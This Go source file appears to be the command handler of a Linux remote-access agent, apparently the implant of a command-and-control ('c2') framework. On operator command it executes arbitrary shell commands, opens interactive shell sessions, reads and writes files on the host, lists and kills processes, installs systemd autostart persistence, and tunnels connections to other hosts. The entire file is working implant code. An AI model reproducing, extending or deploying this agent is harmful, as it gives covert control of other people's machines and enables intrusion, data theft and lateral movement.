//go:build linux

package linuxagent

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"c2/internal/jsonutil"
)

func (a *Agent) handleCommand(id, cmdType string, msg map[string]string, replyTCP bool) {
	var result string
	success := true

	switch cmdType {
	case "exec", "shell":
		if c := msg["command"]; c != "" {
			result = execShell(c)
		}
	case "shell_session_create":
		if sid := msg["session_id"]; sid != "" {
			result = shellCreate(sid, a)
			success = strings.HasPrefix(result, "Session created successfully")
		}
	case "shell_session_write":
		sid := msg["session_id"]
		if sid == "" {
			break
		}
		if b64 := msg["input_b64"]; b64 != "" {
			raw, err := base64.StdEncoding.DecodeString(b64)
			if err != nil {
				result = "invalid input_b64"
				success = false
				break
			}
			if e := shellWrite(sid, raw); e != "" {
				result = e
				success = false
			}
		} else if in := msg["input"]; in != "" {
			if e := shellWrite(sid, []byte(in)); e != "" {
				result = e
				success = false
			}
		}
	case "shell_session_close":
		if sid := msg["session_id"]; sid != "" {
			result = shellClose(sid)
		}
	case "list_dir":
		result = listDirJSON(msg["path"])
	case "list_dir_children":
		result = listDirChildrenJSON(msg["path"])
	case "mkdir":
		var ok bool
		result, ok = mkdirLinux(msg["path"])
		success = ok
	case "download":
		path := msg["path"]
		if path == "" {
			success = false
			result = "missing path"
			break
		}
		if off := msg["offset"]; off != "" {
			o, _ := strconv.ParseUint(off, 10, 64)
			ln := fileChunkSize
			if l := msg["length"]; l != "" {
				if v, err := strconv.Atoi(l); err == nil && v > 0 && v <= 16*1024*1024 {
					ln = v
				}
			}
			var ok bool
			result, ok = readFileRangeB64(path, o, ln)
			success = ok
		} else {
			var ok bool
			result, ok = readFileB64(path)
			success = ok
		}
	case "upload":
		path, content := msg["path"], msg["content"]
		if path == "" {
			success = false
			result = "missing path"
			break
		}
		if ci := msg["chunk_index"]; ci != "" {
			idx, _ := strconv.ParseUint(ci, 10, 64)
			var ok bool
			result, ok = writeFileChunk(path, content, idx)
			success = ok
		} else {
			var ok bool
			result, ok = writeFileFull(path, content)
			success = ok
		}
	case "process_list":
		result = processListJSON()
	case "kill_process":
		pid, err := strconv.Atoi(msg["pid"])
		if err != nil || pid <= 0 {
			success = false
			result = "invalid pid"
		} else {
			success = killPID(int32(pid))
			if !success {
				result = "kill failed"
			}
		}
	case "screenshot", "screen_monitor_start", "screen_monitor_stop":
		success = false
		result = "截图与屏幕监控在 Linux 客户端中未实现"
	case "autostart_set":
		mode := msg["autostart_mode"]
		if mode == "" {
			mode = "systemd_user"
		}
		exe, _ := os.Executable()
		exe, _ = filepath.EvalSymlinks(exe)
		var ok bool
		result, ok = autostartSet(mode, exe)
		success = ok
	case "autostart_remove":
		exe, _ := os.Executable()
		result = autostartRemoveAll(exe)
		success = true
	case "tunnel_connect":
		host, portStr := msg["target_host"], msg["target_port"]
		connID, tidStr := msg["conn_id"], msg["tunnel_id"]
		port, _ := strconv.Atoi(portStr)
		tid, _ := strconv.ParseUint(tidStr, 10, 32)
		if host != "" && port > 0 && connID != "" {
			a.tunnelConnect(connID, host, port, uint32(tid))
		}
		return
	case "tunnel_data":
		if cid, data := msg["conn_id"], msg["data"]; cid != "" && data != "" {
			a.tunnelData(cid, data)
		}
		return
	case "disconnect":
		a.running.Store(false)
		os.Exit(0)
	default:
		success = false
		result = "unknown type: " + cmdType
	}

	resp := map[string]string{
		"type":         "command_response",
		"command_id":   id,
		"result":       result,
		"success":      boolStr(success),
	}
	line, _ := jsonutil.MarshalCompact(resp)
	a.channelSendCommandResponse(line, replyTCP)
}

func boolStr(b bool) string {
	if b {
		return "true"
	}
	return "false"
}
